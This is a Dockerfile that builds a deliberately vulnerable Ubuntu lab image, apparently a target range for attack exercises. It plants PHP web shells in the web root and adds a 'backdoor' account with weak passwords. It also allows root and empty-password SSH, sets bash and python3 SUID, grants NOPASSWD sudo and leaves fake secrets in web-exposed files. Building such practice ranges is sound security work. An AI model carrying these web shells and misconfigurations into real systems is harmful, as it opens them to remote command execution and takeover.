FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
ENV container=docker

# ========== LAYER 1: Minimal essential packages ==========
RUN apt-get update && apt-get install -y --no-install-recommends \
    python3 python3-pip \
    openssh-server \
    apache2 \
    sudo \
    curl \
    net-tools \
    iproute2 \
    procps \
    netcat-openbsd \
    nmap \
    iptables \
    cron \
    && rm -rf /var/lib/apt/lists/*

# ========== LAYER 2: Python packages ==========
RUN pip3 install --no-cache-dir requests flask werkzeug

# ========== LAYER 3: Users ==========
RUN useradd -m -s /bin/bash ubuntu 2>/dev/null || true && \
    useradd -m -s /bin/bash user 2>/dev/null || true && \
    useradd -m -s /bin/bash test 2>/dev/null || true && \
    useradd -m -s /bin/bash victim 2>/dev/null || true && \
    useradd -m -s /bin/bash admin 2>/dev/null || true && \
    useradd -m -s /bin/bash backdoor 2>/dev/null || true && \
    for i in {1..5}; do useradd -m -s /bin/bash user$i 2>/dev/null || true; done && \
    echo 'root:password' | chpasswd && \
    echo 'ubuntu:ubuntu' | chpasswd && \
    echo 'user:user123' | chpasswd && \
    echo 'test:test123' | chpasswd && \
    echo 'victim:victim123' | chpasswd && \
    echo 'admin:admin123' | chpasswd && \
    echo 'backdoor:backdoor123' | chpasswd && \
    for i in {1..5}; do echo "user$i:password$i" | chpasswd; done

# ========== LAYER 4: SSH ==========
RUN mkdir -p /var/run/sshd && \
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config

# ========== LAYER 5: Apache ==========
RUN echo "ServerName localhost" >> /etc/apache2/apache2.conf && \
    mkdir -p /var/www/html/admin && \
    echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php && \
    echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/admin/shell.php && \
    echo '{"username":"admin","password":"admin123"}' > /var/www/html/config.json && \
    chmod 644 /var/www/html/*.php 2>/dev/null || true

# ========== LAYER 6: Cron ==========
RUN mkdir -p /tmp/backups /var/www/html/uploads && \
    chmod 777 /tmp /var/tmp /tmp/backups /var/www/html/uploads 2>/dev/null || true && \
    echo "*/5 * * * * root /bin/echo 'cron job' >> /var/log/cron.log" >> /etc/crontab && \
    echo "@reboot root /usr/bin/python3 /tmp/backup.py" >> /etc/crontab

# ========== LAYER 7: Credentials ==========
RUN echo "DB_PASSWORD=SuperSecret123!" > /var/www/html/.env && \
    echo "API_KEY=sk-1234567890abcdef" >> /var/www/html/.env && \
    echo "SECRET_KEY=verysecretkey123" > /root/.secret && \
    echo 'root:password' > /var/www/html/passwords.txt && \
    echo 'admin:admin' >> /var/www/html/passwords.txt && \
    echo "Backup of /etc/passwd:" > /tmp/backups/passwd.bak && \
    cat /etc/passwd >> /tmp/backups/passwd.bak

# ========== LAYER 8: SUID ==========
RUN echo "ubuntu ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers && \
    echo "user ALL=(ALL) NOPASSWD: /bin/systemctl" >> /etc/sudoers && \
    chmod 4755 /bin/bash 2>/dev/null || true && \
    chmod 4755 /usr/bin/python3 2>/dev/null || true

# ========== LAYER 9: Masquerading ==========
RUN ln -s /bin/bash /bin/ls_hidden 2>/dev/null || true && \
    ln -s /usr/bin/python3 /usr/bin/status_check 2>/dev/null || true

# ========== LAYER 10: Scripts ==========
RUN echo '#!/usr/bin/env python3\nimport os\nos.system("echo running")' > /tmp/malicious.py && \
    chmod +x /tmp/malicious.py && \
    echo '#!/usr/bin/env python3\nimport os\nwith open("/tmp/creds.txt","w") as f:\n    f.write("password=secret123")' > /tmp/backup.py && \
    chmod +x /tmp/backup.py

# ========== LAYER 11: Files ==========
COPY start.sh /start.sh
COPY victim_agent.py /victim_agent.py
RUN chmod +x /start.sh

EXPOSE 80 22 8000

CMD ["/bin/bash", "/start.sh"]
